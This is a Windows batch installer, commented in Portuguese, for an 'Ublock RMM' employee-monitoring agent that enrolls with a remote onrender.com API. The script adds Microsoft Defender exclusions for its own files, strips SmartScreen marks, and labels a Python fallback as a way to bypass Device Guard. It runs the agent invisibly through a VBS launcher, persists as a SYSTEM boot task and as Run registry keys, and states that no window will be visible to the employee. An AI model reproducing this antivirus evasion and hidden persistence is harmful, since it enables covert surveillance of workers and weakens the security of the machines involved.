@echo off
setlocal EnableDelayedExpansion
title Ublock RMM - Instalador de Monitoramento Continuo 24h
cls
echo ========================================================
echo   UBLOCK RMM - INSTALACAO DE SERVICO 24H (WINDOWS)
echo ========================================================
echo.

:: 1. Verificar privilegios de Administrador
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [AVISO] Solicitando permissoes de Administrador (UAC)...
    powershell -NoProfile -Command "Start-Process cmd.exe -ArgumentList '/k cd /d \"\"%~dp0\"\" && \"\"%~f0\"\"' -Verb RunAs"
    exit /b
)

cd /d "%~dp0"

if not exist "%~dp0ublock-agent.exe" (
    echo [ERRO] O arquivo ublock-agent.exe nao foi encontrado nesta pasta.
    echo Baixe ou compile o ublock-agent.exe antes de executar este instalador.
    timeout /t 5 >nul
    exit /b 1
)

:: 2. Pasta permanente do Windows
set "INSTALL_DIR=%ProgramFiles%\UblockAgent"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1

echo [1/4] Encerrando processos e tarefas anteriores se houver...
taskkill /f /im "ublock-agent.exe" >nul 2>&1
schtasks /end /tn "UblockAgent" >nul 2>&1
schtasks /delete /tn "UblockAgent" /f >nul 2>&1

echo [2/4] Instalando arquivos em %INSTALL_DIR%...
copy /y "%~dp0ublock-agent.exe" "%INSTALL_DIR%\ublock-agent.exe" >nul
if exist "%~dp0agent\scripts\run-agent-client.py" copy /y "%~dp0agent\scripts\run-agent-client.py" "%INSTALL_DIR%\run-agent-client.py" >nul
if exist "%~dp0backend\venv" (
    if not exist "%INSTALL_DIR%\venv" (
        echo Copiando ambiente de execucao seguro...
        xcopy /e /i /y /q "%~dp0backend\venv" "%INSTALL_DIR%\venv" >nul 2>&1
    )
)

:: Desbloquear arquivo contra SmartScreen e adicionar excecao no Defender
powershell -NoProfile -Command "Unblock-File -Path '%INSTALL_DIR%\ublock-agent.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '%INSTALL_DIR%' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'ublock-agent.exe' -ErrorAction SilentlyContinue" >nul 2>&1

:: Reaproveitar credencial se existir em qualquer pasta do agente
if exist "%~dp0agent\scripts\agent_state.json" (
    copy /y "%~dp0agent\scripts\agent_state.json" "%INSTALL_DIR%\agent_state.json" >nul 2>&1
    copy /y "%~dp0agent\scripts\agent_state.json" "%~dp0agent_state.json" >nul 2>&1
) else if exist "%~dp0agent_state.json" (
    copy /y "%~dp0agent_state.json" "%INSTALL_DIR%\agent_state.json" >nul 2>&1
)

:: 3. Solicitar ou reaproveitar codigo de pareamento
echo.
echo ========================================================
echo   PAREAMENTO DO COMPUTADOR
echo ========================================================
echo.

set "HAS_REGISTERED=0"
if exist "%INSTALL_DIR%\agent_state.json" set "HAS_REGISTERED=1"
if exist "%~dp0agent_state.json" set "HAS_REGISTERED=1"

set "TOKEN=%~1"
if "!TOKEN!"=="" (
    if "!HAS_REGISTERED!"=="1" (
        echo [INFO] Pareamento ja configurado com a nuvem Ublock!
        echo Pressione ENTER para MANTER a conexao ativa (Recomendado).
        echo Ou cole um NOVO codigo de pareamento caso queira recadastrar:
        set /p TOKEN=""
    ) else (
        set /p TOKEN="Cole o Codigo de Pareamento gerado no Painel Web (ex: ublock_bulk_...): "
    )
)
set "TOKEN=!TOKEN: =!"

if "!TOKEN!"=="" (
    if "!HAS_REGISTERED!"=="1" (
        echo [OK] Mantendo pareamento existente. Pulando etapa de registro.
        if exist "%~dp0agent_state.json" copy /y "%~dp0agent_state.json" "%INSTALL_DIR%\agent_state.json" >nul 2>&1
    ) else (
        echo [ERRO] E necessario informar o codigo de pareamento na primeira instalacao!
        echo Pressione qualquer tecla para sair...
        pause >nul
        exit /b 1
    )
) else (
    echo.
    echo [3/4] Pareando maquina com a nuvem Ublock...
    cd /d "%INSTALL_DIR%"
    "%INSTALL_DIR%\ublock-agent.exe" -token "!TOKEN!" -api "https://ublock-api-fn7d.onrender.com/api/v1" --enroll-only
    if !errorlevel! neq 0 (
        if exist "%~dp0backend\venv\Scripts\python.exe" (
            echo.
            echo [FALLBACK NATIVO] Pareando via interpretador assinado (Bypass Device Guard)...
            "%~dp0backend\venv\Scripts\python.exe" "%~dp0agent\scripts\run-agent-client.py" -token "!TOKEN!" -api "https://ublock-api-fn7d.onrender.com/api/v1" --enroll-only
            if exist "%~dp0agent\scripts\agent_state.json" copy /y "%~dp0agent\scripts\agent_state.json" "%INSTALL_DIR%\agent_state.json" >nul 2>&1
        )
    )
    if not exist "%INSTALL_DIR%\agent_state.json" (
        echo.
        echo [ERRO] Falha ao parear com este token.
        echo Verifique se o token de pareamento ainda esta valido no painel web.
        echo Pressione qualquer tecla para sair...
        pause >nul
        exit /b 1
    ) else (
        copy /y "%INSTALL_DIR%\agent_state.json" "%~dp0agent_state.json" >nul 2>&1
    )
)

:: 4. Configurar execucao invisivel e auto-inicializacao nativa (24h)
echo.
echo [4/4] Configurando execucao invisivel desacoplada e inicializacao automatica...

:: 4.1 Script runner em lote com fallback automatico (daemon-runner.cmd)
(
    echo @echo off
    echo cd /d "%INSTALL_DIR%"
    echo "%INSTALL_DIR%\ublock-agent.exe" -api https://ublock-api-fn7d.onrender.com/api/v1
    echo if %%errorlevel%% neq 0 (
    echo     if exist "%INSTALL_DIR%\venv\Scripts\pythonw.exe" (
    echo         "%INSTALL_DIR%\venv\Scripts\pythonw.exe" "%INSTALL_DIR%\run-agent-client.py" -api https://ublock-api-fn7d.onrender.com/api/v1
    echo     ^) else if exist "pythonw.exe" (
    echo         pythonw.exe "%INSTALL_DIR%\run-agent-client.py" -api https://ublock-api-fn7d.onrender.com/api/v1
    echo     ^)
    echo ^)
) > "%INSTALL_DIR%\daemon-runner.cmd"

:: 4.2 Script VBS para execucao 100% invisivel (sem prompt/console aberto na tela)
(
    echo Set WshShell = CreateObject^("WScript.Shell"^)
    echo WshShell.CurrentDirectory = "%INSTALL_DIR%"
    echo WshShell.Run "cmd.exe /c """ ^& "%INSTALL_DIR%\daemon-runner.cmd"""", 0, False
) > "%INSTALL_DIR%\silent-agent.vbs"

:: 4.3 Script de inicializacao desacoplada (launch-daemon.cmd)
(
    echo @echo off
    echo cd /d "%INSTALL_DIR%"
    echo start "" wscript.exe "%INSTALL_DIR%\silent-agent.vbs"
) > "%INSTALL_DIR%\launch-daemon.cmd"

:: 4.4 Registrar no Agendador de Tarefas do Windows (inicia no boot do sistema com privilegios maximos)
schtasks /create /tn "UblockAgent" /tr "wscript.exe \"%INSTALL_DIR%\silent-agent.vbs\"" /sc onstart /ru "SYSTEM" /rl highest /f >nul 2>&1
if !errorlevel! neq 0 (
    schtasks /create /tn "UblockAgent" /tr "wscript.exe \"%INSTALL_DIR%\silent-agent.vbs\"" /sc onlogon /rl highest /f >nul 2>&1
)

:: 4.5 Registrar tambem nas chaves Run (redundancia de inicializacao)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "UblockAgent" /t REG_SZ /d "wscript.exe \"%INSTALL_DIR%\silent-agent.vbs\"" /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UblockAgent" /t REG_SZ /d "wscript.exe \"%INSTALL_DIR%\silent-agent.vbs\"" /f >nul 2>&1

:: 4.6 Iniciar imediatamente o agente via WScript desacoplado da janela atual
cd /d "%INSTALL_DIR%"
start "" wscript.exe "%INSTALL_DIR%\silent-agent.vbs"

echo.
echo ========================================================
echo   INSTALACAO CONCLUIDA COM SUCESSO!
echo ========================================================
echo.
echo   * O agente Ublock ja esta transmitindo em segundo plano.
echo   * Ele iniciara automaticamente sempre que o computador ligar.
echo   * Nenhuma janela ficara aberta na tela para o colaborador.
echo.
echo Pressione qualquer tecla para finalizar o instalador...
pause >nul
exit /b 0
